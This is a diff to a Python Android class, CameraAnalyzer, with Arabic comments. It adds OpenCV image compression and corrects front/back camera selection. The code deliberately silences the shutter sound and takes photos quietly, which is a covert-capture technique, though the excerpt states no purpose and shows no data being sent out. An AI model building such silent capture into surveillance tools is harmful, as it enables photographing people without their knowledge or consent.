@@ -68,7 +68,26 @@ class CameraAnalyzer:
         except Exception as e:
             logging.error(f"Mute error: {e}")
 
-    # ========== التقاط صورة (صامتة) ==========
+    # ========== ضغط الصورة (لتوفير المساحة والطاقة) ==========
+    def _compress_image(self, path, quality=80):
+        """يحاول ضغط ملف الصورة إلى جودة أقل باستخدام OpenCV (إذا كان متوفراً)"""
+        try:
+            import cv2
+            img = cv2.imread(path)
+            if img is not None:
+                encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), quality]
+                _, buffer = cv2.imencode('.jpg', img, encode_param)
+                with open(path, 'wb') as f:
+                    f.write(buffer)
+                return True
+        except ImportError:
+            # OpenCV غير مثبت – تجاهل بهدوء
+            pass
+        except Exception as e:
+            logging.error(f"Compression error: {e}")
+        return False
+
+    # ========== التقاط صورة (صامتة) مع تحديد الكاميرا بدقة ==========
     def capture(self, cam_id=0):
         """
         تلتقط صورة باستخدام Camera1 API.
@@ -89,23 +108,17 @@ class CameraAnalyzer:
                 CameraInfo = autoclass('android.hardware.Camera$CameraInfo')
                 num_cameras = Camera.getNumberOfCameras()
 
-                # تحديد معرف الكاميرا المطلوبة
+                # ===== تصحيح اختيار الكاميرا =====
                 target_id = -1
-                if cam_id == 0:  # خلفية
-                    # أول كاميرا عادةً تكون خلفية
-                    target_id = 0
-                elif cam_id == 1:  # أمامية
-                    for i in range(num_cameras):
-                        info = CameraInfo()
-                        Camera.getCameraInfo(i, info)
-                        if info.facing == CameraInfo.CAMERA_FACING_FRONT:
-                            target_id = i
-                            break
-                else:
-                    target_id = 0
-
+                desired_facing = CameraInfo.CAMERA_FACING_BACK if cam_id == 0 else CameraInfo.CAMERA_FACING_FRONT
+                for i in range(num_cameras):
+                    info = CameraInfo()
+                    Camera.getCameraInfo(i, info)
+                    if info.facing == desired_facing:
+                        target_id = i
+                        break
                 if target_id == -1:
-                    logging.error("No suitable camera found")
+                    logging.error("No suitable camera found for facing: %d", desired_facing)
                     return None
 
                 camera = Camera.open(target_id)
@@ -121,6 +134,7 @@ class CameraAnalyzer:
                 # إعدادات الصورة والإخراج
                 params.setPictureFormat(autoclass('android.graphics.ImageFormat').JPEG)
                 params.set("shutter-sound", 0)  # إسكات صوت الكاميرا
+                # التدوير حسب نوع الكاميرا
                 rotation = 270 if cam_id == 1 else 90
                 params.setRotation(rotation)
                 camera.setParameters(params)
@@ -139,12 +153,16 @@ class CameraAnalyzer:
                 camera.startPreview()
                 camera.takePicture(None, None, PicCallback())
 
-                # 🔧 زيادة المهلة إلى 15 ثانية (كانت 7 ثوانٍ)
+                # مهلة 15 ثانية
                 if not image_saved.wait(15):
                     logging.warning("Camera capture timeout after 15 seconds")
                     out_path = None
 
                 camera.stopPreview()
+
+                # ضغط الصورة فور التقاطها (إذا أمكن)
+                if out_path and os.path.exists(out_path):
+                    self._compress_image(out_path, quality=80)
 
             except Exception as e:
                 logging.error(f"Capture error: {e}")
